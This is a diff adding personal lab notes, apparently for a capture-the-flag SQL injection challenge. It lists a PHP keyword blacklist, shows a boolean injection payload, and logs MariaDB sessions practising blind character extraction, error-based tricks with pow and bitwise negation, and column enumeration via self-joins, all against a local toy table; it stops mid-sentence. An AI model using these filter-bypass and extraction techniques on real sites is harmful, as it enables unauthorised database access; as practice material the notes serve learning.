@@ -1,0 +1,160 @@
+/union
+and
+or
+on
+cast
+sys
+inno
+mid
+substr
+pad
+space
+if
+case
+exp
+like
+sound
+produce
+extract
+xml
+between
+count
+column
+sleep
+benchmark
+\<
+\>
+\=/is' , $_GET['id'])) 
+
+concat
+having 
+where
+limit 
+|| 
+&& 
+
+1 || (select user from users limit 1) = 'admin'
+
+MariaDB [shop]> select lpad(name,10,1) from flag_here_hihi;
++-----------------+
+| lpad(name,10,1) |
++-----------------+
+| 1nice_flag      |
+| 1fake_flag      |
+| 1cool_flag      |
++-----------------+
+
+MariaDB [shop]> select * from flag_here_hihi where id = (select id from flag_here_hihi limit 1 offset 2);
++----+-----------+
+| ID | name      |
++----+-----------+
+|  3 | cool_flag |
++----+-----------+
+
+MariaDB [shop]> select (select name from flag_here_hihi limit 1);
++-------------------------------------------+
+| (select name from flag_here_hihi limit 1) |
++-------------------------------------------+
+| nice_flag                                 |
++-------------------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [shop]> select (LEFT((select name from flag_here_hihi limit 1),1));
++-----------------------------------------------------+
+| (LEFT((select name from flag_here_hihi limit 1),1)) |
++-----------------------------------------------------+
+| n                                                   |
++-----------------------------------------------------+
+
+MariaDB [shop]> select ASCII(LEFT((select name from flag_here_hihi limit 1),1));
++----------------------------------------------------------+
+| ASCII(LEFT((select name from flag_here_hihi limit 1),1)) |
++----------------------------------------------------------+
+|                                                      110 |
++----------------------------------------------------------+
+1 row in set (0.047 sec)
+
+MariaDB [shop]> select (ASCII(LEFT((select name from flag_here_hihi limit 1),1))/110);
++----------------------------------------------------------------+
+| (ASCII(LEFT((select name from flag_here_hihi limit 1),1))/110) |
++----------------------------------------------------------------+
+|                                                         1.0000 |
++----------------------------------------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [shop]> select * from flag_here_hihi where id = (select (ASCII(LEFT((select name from flag_here_hihi limit 1),1))/110));
++----+-----------+
+| ID | name      |
++----+-----------+
+|  1 | nice_flag |
++----+-----------+
+1 row in set (0.001 sec)
+
+
+MariaDB [shop]> (select id from (select * from flag_here_hihi limit 1) as a);
++----+
+| id |
++----+
+|  1 |
++----+
+1 row in set (0.001 sec)
+
+
+bitwise negation
+MariaDB [shop]> select (~(select id from (select * from flag_here_hihi limit 1) as a));
++-----------------------------------------------------------------+
+| (~(select id from (select * from flag_here_hihi limit 1) as a)) |
++-----------------------------------------------------------------+
+|                                            18446744073709551614 |
++-----------------------------------------------------------------+
+1 row in set (0.001 sec)
+
+using pow function
+MariaDB [shop]> select pow(~(select id from (select * from flag_here_hihi limit 1) as a),3);
++----------------------------------------------------------------------+
+| pow(~(select id from (select * from flag_here_hihi limit 1) as a),3) |
++----------------------------------------------------------------------+
+|                                                 6.277101735386681e57 |
++----------------------------------------------------------------------+
+
+Learning point from this: dont put too many unnecessary bracklets 
+
+MariaDB [shop]> select pow(~(select id from (select * from flag_here_hihi limit 1) as a),9999);
+ERROR 1690 (22003): DOUBLE value is out of range in 'pow(~(select #),9999)'
+
+my table not echoing error message though
+
+Enumerating columns!
+
+MariaDB [shop]> select * from flag_here_hihi;
++----+-----------+-------+
+| ID | name      | phone |
++----+-----------+-------+
+|  1 | nice_flag | NULL  |
+|  2 | fake_flag | NULL  |
+|  3 | cool_flag | NULL  |
++----+-----------+-------+
+3 rows in set (0.000 sec)
+
+MariaDB [shop]> (select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id)) as c);
+ERROR 1060 (42S21): Duplicate column name 'name'
+MariaDB [shop]> (select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id,name)) as c);
+ERROR 1060 (42S21): Duplicate column name 'phone'
+
+MariaDB [shop]> select * from flag_here_hihi as a join flag_here_hihi as b using(id);
++----+-----------+-------+-----------+-------+
+| ID | name      | phone | name      | phone |
++----+-----------+-------+-----------+-------+
+|  1 | nice_flag | NULL  | nice_flag | NULL  |
+|  2 | fake_flag | NULL  | fake_flag | NULL  |
+|  3 | cool_flag | NULL  | cool_flag | NULL  |
++----+-----------+-------+-----------+-------+
+3 rows in set (0.000 sec)
+
+MariaDB [shop]> select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id));
+ERROR 1248 (42000): Every derived table must have its own alias
+MariaDB [shop]> select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id)) as c;
+ERROR 1060 (42S21): Duplicate column name 'name'
+
+USING is useful when both tables share a column of the exact same name on which they join. In this case, one may say:
+
